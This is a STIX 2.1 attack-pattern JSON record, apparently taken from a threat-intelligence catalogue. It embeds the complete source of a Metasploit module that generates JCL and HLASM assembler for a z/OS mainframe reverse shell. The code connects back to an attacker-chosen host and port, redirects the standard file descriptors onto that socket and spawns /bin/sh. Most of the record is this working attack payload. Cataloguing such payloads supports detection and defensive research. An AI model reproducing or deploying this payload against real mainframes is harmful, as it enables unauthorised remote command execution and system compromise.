{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4e6095c8-3ce0-47f0-ba74-d58d346d537b",
    "created": "2024-08-14T16:33:19.296782Z",
    "modified": "2024-08-14T16:33:19.296785Z",
    "name": "Z/OS (MVS) Command Shell, Reverse TCP",
    "description": "Provide JCL which creates a reverse shell This implementation does not include ebcdic character translation so a client with translation capabilities is required.  MSF handles this automatically.'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/mainframe/reverse_shell_jcl.rb",
            "external_id": "reverse_shell_jcl.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n# This payload has no ebcdic<->ascii translator built in.\n# Therefore it must use a shell which does, like mainframe_shell\n#\n# this payload will spawn a reverse shell from z/os, when submitted\n#  on the system as JCL to JES2\n##\n\n\nmodule MetasploitModule\n  CachedSize = 8993\n  include Msf::Payload::Single\n  include Msf::Payload::Mainframe\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n                     'Name'          => 'Z/OS (MVS) Command Shell, Reverse TCP',\n                     'Description'   => 'Provide JCL which creates a reverse shell\n                       This implementation does not include ebcdic character translation,\n                       so a client with translation capabilities is required.  MSF handles\n                       this automatically.',\n                     'Author'        => 'Bigendian Smalls',\n                     'License'       => MSF_LICENSE,\n                     'Platform'      => 'mainframe',\n                     'Arch'          => ARCH_CMD,\n                     'Handler'       => Msf::Handler::ReverseTcp,\n                     'Session'       => Msf::Sessions::MainframeShell,\n                     'PayloadType'   => 'cmd',\n                     'RequiredCmd'   => 'jcl',\n                     'Payload'       =>\n      {\n        'Offsets' => {},\n        'Payload' => ''\n      }))\n    register_options(\n      [\n        # need these defaulted so we can manipulate them in command_string\n        Opt::LHOST('0.0.0.0'),\n        Opt::LPORT(4444),\n        OptString.new('ACTNUM', [true, \"Accounting info for JCL JOB card\", \"MSFUSER-ACCTING-INFO\"]),\n        OptString.new('PGMNAME', [true, \"Programmer name for JCL JOB card\", \"programmer name\"]),\n        OptString.new('JCLASS', [true, \"Job Class for JCL JOB card\", \"A\"]),\n        OptString.new('NOTIFY', [false, \"Notify User for JCL JOB card\", \"\"]),\n        OptString.new('MSGCLASS', [true, \"Message Class for JCL JOB card\", \"Z\"]),\n        OptString.new('MSGLEVEL', [true, \"Message Level for JCL JOB card\", \"(0,0)\"])\n      ], self.class\n    )\n    register_advanced_options(\n      [\n        OptBool.new('NTFYUSR', [true, \"Include NOTIFY Parm?\", false]),\n        OptString.new('JOBNAME', [true, \"Job name for JCL JOB card\", \"DUMMY\"])\n      ],\n      self.class\n    )\n  end\n\n  ##\n  # Construct Payload\n  ##\n  def generate(_opts = {})\n    super + command_string\n  end\n\n  ##\n  # Setup replacement vars and populate payload\n  ##\n  def command_string\n    if (datastore['JOBNAME'] == \"DUMMY\") && !datastore['FTPUSER'].nil?\n      datastore['JOBNAME'] = (datastore['FTPUSER'] + \"1\").strip.upcase\n    end\n    lhost = Rex::Socket.resolv_nbo(datastore['LHOST'])\n    lhost = lhost.unpack(\"H*\")[0]\n    lport = datastore['LPORT']\n    lport = lport.to_s.to_i.to_s(16).rjust(4, '0')\n\n    jcl_jobcard +\n      \"//**************************************/\\n\" \\\n      \"//*  SPAWN REVERSE SHELL FOR MSF MODULE*/\\n\" \\\n      \"//**************************************/\\n\" \\\n      \"//*\\n\" \\\n      \"//STEP1      EXEC PROC=ASMACLG,PARM.L=(CALL)\\n\" \\\n      \"//L.SYSLIB   DD  DSN=SYS1.CSSLIB,DISP=SHR\\n\" \\\n      \"//C.SYSIN    DD  *,DLM=ZZ\\n\" \\\n      \"         TITLE  'Spanws Reverse Shell'\\n\" \\\n      \"SPAWNREV CSECT\\n\" \\\n      \"SPAWNREV AMODE 31\\n\" \\\n      \"SPAWNREV RMODE ANY\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"*        @SETUP registers and save areas                              *\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"         USING *,15\\n\" \\\n      \"@SETUP0  B     @SETUP1\\n\" \\\n      \"         DROP  15\\n\" \\\n      \"         DS    0H                 # half word boundary\\n\" \\\n      \"@SETUP1  STM   14,12,12(13)       # save our registers\\n\" \\\n      \"         LR    2,13               # callers sa\\n\" \\\n      \"         LR    8,15               # pgm base in R8\\n\" \\\n      \"         USING @SETUP0,8          # R8 for base addressability\\n\" \\\n      \"*************************************\\n\" \\\n      \"* set up data area / addressability *\\n\" \\\n      \"*************************************\\n\" \\\n      \"         L     0,@DYNSIZE         # len of variable area\\n\" \\\n      \"         GETMAIN RU,LV=(0)        # get data stg, len R0\\n\" \\\n      \"         LR    13,1               # data address\\n\" \\\n      \"         USING @DATA,13           # addressability for data area\\n\" \\\n      \"         ST    2,@BACK            # store callers sa address\\n\" \\\n      \"         ST    13,8(,2)           # store our data addr\\n\" \\\n      \"         DS    0H                 # halfword boundaries\\n\" \\\n      \"\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"*        BPX1SOC set up socket - inline                               *\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"         CALL  BPX1SOC,                                                X\\n\" \\\n      \"               (DOM,TYPE,PROTO,DIM,CLIFD,                              X\\n\" \\\n      \"               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\\n\" \\\n      \"\\n\" \\\n      \"*******************************\\n\" \\\n      \"*  chk return code, 0 or exit *\\n\" \\\n      \"*******************************\\n\" \\\n      \"         LHI   15,2\\n\" \\\n      \"         L     7,RTN_VAL\\n\" \\\n      \"         CIB   7,0,7,EXITP        # R7 not 0? Time to exit\\n\" \\\n      \"\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"*        BPX1CON (connect) connect to remote host - inline            *\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct\\n\" \\\n      \"         MVI   SOCK_FAMILY,AF_INET          # family inet\\n\" \\\n      \"         MVI   SOCK_LEN,SOCK#LEN            # len of socket\\n\" \\\n      \"         MVC   SOCK_SIN_PORT,CONNSOCK       # port to connect to\\n\" \\\n      \"         MVC   SOCK_SIN_ADDR,CONNADDR       # address to connect to\\n\" \\\n      \"         CALL  BPX1CON,                                                X\\n\" \\\n      \"               (CLIFD,SOCKLEN,SOCKADDR,                                X\\n\" \\\n      \"               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\\n\" \\\n      \"*******************************\\n\" \\\n      \"*  chk return code, 0 or exit *\\n\" \\\n      \"*******************************\\n\" \\\n      \"         LHI   15,3\\n\" \\\n      \"         L     7,RTN_VAL\\n\" \\\n      \"         CIB   7,0,7,EXITP        # R7 not 0? Time to exit\\n\" \\\n      \"\\n\" \\\n      \"*************************************************\\n\" \\\n      \"* order of things to prep child pid             *\\n\" \\\n      \"*  0) Dupe all 3 file desc of CLIFD             *\\n\" \\\n      \"*  1) dupe parent read fd to std input          *\\n\" \\\n      \"*************************************************\\n\" \\\n      \"*******************\\n\" \\\n      \"*****  STDIN  *****\\n\" \\\n      \"*******************\\n\" \\\n      \"         CALL  BPX1FCT,                                                X\\n\" \\\n      \"               (CLIFD,                                                 X\\n\" \\\n      \"               =A(F_DUPFD2),                                           X\\n\" \\\n      \"               =A(F_STDI),                                             X\\n\" \\\n      \"               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\\n\" \\\n      \"****************************************************\\n\" \\\n      \"*  chk return code here anything but -1 is ok      *\\n\" \\\n      \"****************************************************\\n\" \\\n      \"         LHI   15,4               # exit code for this func\\n\" \\\n      \"         L     7,RTN_VAL          # set r7 to rtn val\\n\" \\\n      \"         CIB   7,-1,8,EXITP       # R7 = -1 exit\\n\" \\\n      \"\\n\" \\\n      \"*******************\\n\" \\\n      \"*****  STDOUT *****\\n\" \\\n      \"*******************\\n\" \\\n      \"         CALL  BPX1FCT,                                                X\\n\" \\\n      \"               (CLIFD,                                                 X\\n\" \\\n      \"               =A(F_DUPFD2),                                           X\\n\" \\\n      \"               =A(F_STDO),                                             X\\n\" \\\n      \"               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\\n\" \\\n      \"****************************************************\\n\" \\\n      \"*  chk return code here anything but -1 is ok      *\\n\" \\\n      \"****************************************************\\n\" \\\n      \"         LHI   15,5               # exit code for this func\\n\" \\\n      \"         L     7,RTN_VAL          # set r7 to rtn val\\n\" \\\n      \"         CIB   7,-1,8,EXITP       # R7 = -1 exit\\n\" \\\n      \"\\n\" \\\n      \"*******************\\n\" \\\n      \"*****  STDERR *****\\n\" \\\n      \"*******************\\n\" \\\n      \"         CALL  BPX1FCT,                                                X\\n\" \\\n      \"               (CLIFD,                                                 X\\n\" \\\n      \"               =A(F_DUPFD2),                                           X\\n\" \\\n      \"               =A(F_STDE),                                             X\\n\" \\\n      \"               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\\n\" \\\n      \"****************************************************\\n\" \\\n      \"*  chk return code here anything but -1 is ok      *\\n\" \\\n      \"****************************************************\\n\" \\\n      \"         LHI   15,6               # exit code for this func\\n\" \\\n      \"         L     7,RTN_VAL          # set r7 to rtn val\\n\" \\\n      \"         CIB   7,-1,8,EXITP       # R7 = -1 exit\\n\" \\\n      \"\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"*        BP1SPN (SPAWN) execute shell '/bin/sh'                       *\\n\" \\\n      \"***********************************************************************\\n\" \\\n      \"         XC    INHE(INHE#LENGTH),INHE   # clear inhe structure\\n\" \\\n      \"         XI    INHEFLAGS0,INHESETPGROUP\\n\" \\\n      \"         SPACE ,\\n\" \\\n      \"         MVC   INHEEYE,=C'INHE'\\n\" \\\n      \"         LH    0,TLEN\\n\" \\\n      \"         STH   0,INHELENGTH\\n\" \\\n      \"         LH    0,TVER\\n\" \\\n      \"         STH   0,INHEVERSION\\n\" \\\n      \"         CALL  BPX1SPN,                                                X\\n\" \\\n      \"               (EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,EXENVC,EXENVLL,     X\\n\" \\\n      \"               EXENVL,FDCNT,FDLST,=A(INHE#LENGTH),INHE,RTN_VAL,        X\\n\" \\\n      \"               RTN_COD,RSN_COD),VL,MF=(E,PLIST)\\n\" \\\n      \"         LHI   15,7               # exit code for this func\\n\" \\\n      \"         L     7,RTN_VAL          # set r7 to rtn val\\n\" \\\n      \"         CIB   7,-1,8,EXITP       # R7 = -1 exit\\n\" \\\n      \"\\n\" \\\n      \"****************************************************\\n\" \\\n      \"* cleanup & exit preload R15 with exit code        *\\n\" \\\n      \"****************************************************\\n\" \\\n      \"         XR    15,15              # 4 FOR rc\\n\" \\\n      \"EXITP    L     0,@DYNSIZE\\n\" \\\n      \"         LR    1,13\\n\" \\\n      \"         L     13,@BACK\\n\" \\\n      \"         DROP  13\\n\" \\\n      \"         FREEMAIN RU,LV=(0),A=(1) # Free storage\\n\" \\\n      \"         L     14,12(,13)         # load R14\\n\" \\\n      \"         LM    0,12,20(13)        # load 0-12\\n\" \\\n      \"         BSM   0,14               # branch to caller\\n\" \\\n      \"\\n\" \\\n      \"****************************************************\\n\" \\\n      \"* Constants and Variables                          *\\n\" \\\n      \"****************************************************\\n\" \\\n      \"         DS    0F                 # constants full word boundary\\n\" \\\n      \"F_STDI   EQU   0\\n\" \\\n      \"F_STDO   EQU   1\\n\" \\\n      \"F_STDE   EQU   2\\n\" \\\n      \"*************************\\n\" \\\n      \"* Socket conn variables *         # functions used by pgm\\n\" \\\n      \"*************************\\n\" \\\n      \"CONNSOCK DC    XL2'#{lport}'    # LPORT\\n\" \\\n      \"CONNADDR DC    XL4'#{lhost}'    # LHOST\\n\" \\\n      \"DOM      DC    A(AF_INET)         # AF_INET = 2\\n\" \\\n      \"TYPE     DC    A(SOCK#_STREAM)    # stream = 1\\n\" \\\n      \"PROTO    DC    A(IPPROTO_IP)      # ip = 0\\n\" \\\n      \"DIM      DC    A(SOCK#DIM_SOCKET) # dim_sock = 1\\n\" \\\n      \"SOCKLEN  DC    A(SOCK#LEN+SOCK_SIN#LEN)\\n\" \\\n      \"************************\\n\" \\\n      \"* BPX1SPN vars *********\\n\" \\\n      \"************************\\n\" \\\n      \"EXCMD    DC    CL7'/bin/sh'       # command to exec\\n\" \\\n      \"EXCMDL   DC    A(L'EXCMD)         # len of cmd to exec\\n\" \\\n      \"EXARGC   DC    F'1'               # num of arguments\\n\" \\\n      \"EXARG1   DC    CL2'sh'            # arg 1 to exec\\n\" \\\n      \"EXARG1L  DC    A(L'EXARG1)        # len of arg1\\n\" \\\n      \"EXARGL   DC    A(EXARG1)          # addr of argument list\\n\" \\\n      \"EXARGLL  DC    A(EXARG1L)         # addr of arg len list\\n\" \\\n      \"EXENVC   DC    F'0'               # env var count\\n\" \\\n      \"EXENVL   DC    F'0'               # env var arg list addr\\n\" \\\n      \"EXENVLL  DC    F'0'               # env var arg len addr\\n\" \\\n      \"FDCNT    DC    F'0'               # field count s/b 0\\n\" \\\n      \"FDLST    DC    F'0'               # field list addr s/b 0\\n\" \\\n      \"TVER     DC    AL2(INHE#VER)\\n\" \\\n      \"TLEN     DC    AL2(INHE#LENGTH)\\n\" \\\n      \"         SPACE ,\\n\" \\\n      \"@DYNSIZE DC    A(@ENDYN-@DATA)\\n\" \\\n      \"***************************\\n\" \\\n      \"***** end of constants ****\\n\" \\\n      \"***************************\\n\" \\\n      \"@DATA    DSECT ,\\n\" \\\n      \"         DS    0D\\n\" \\\n      \"PLIST    DS    16A\\n\" \\\n      \"RTN_VAL  DS    F                  # return value\\n\" \\\n      \"RTN_COD  DS    F                  # return code\\n\" \\\n      \"RSN_COD  DS    F                  # reason code\\n\" \\\n      \"CLIFD    DS    F                  # client fd\\n\" \\\n      \"@BACK    DS    A\\n\" \\\n      \"*\\n\" \\\n      \"         BPXYSOCK   LIST=NO,DSECT=NO\\n\" \\\n      \"         BPXYFCTL   LIST=NO,DSECT=NO\\n\" \\\n      \"         BPXYINHE   LIST=NO,DSECT=NO\\n\" \\\n      \"@ENDYN   EQU   *\\n\" \\\n      \"@DATA#LEN EQU  *-@DATA\\n\" \\\n      \"         BPXYCONS   LIST=NO\\n\" \\\n      \"         END   SPAWNREV\\n\" \\\n      \"ZZ\\n\" \\\n      \"//*\\n\"\n  end\nend\n",
    "x_mitre_platforms": [
        "mainframe'"
    ]
}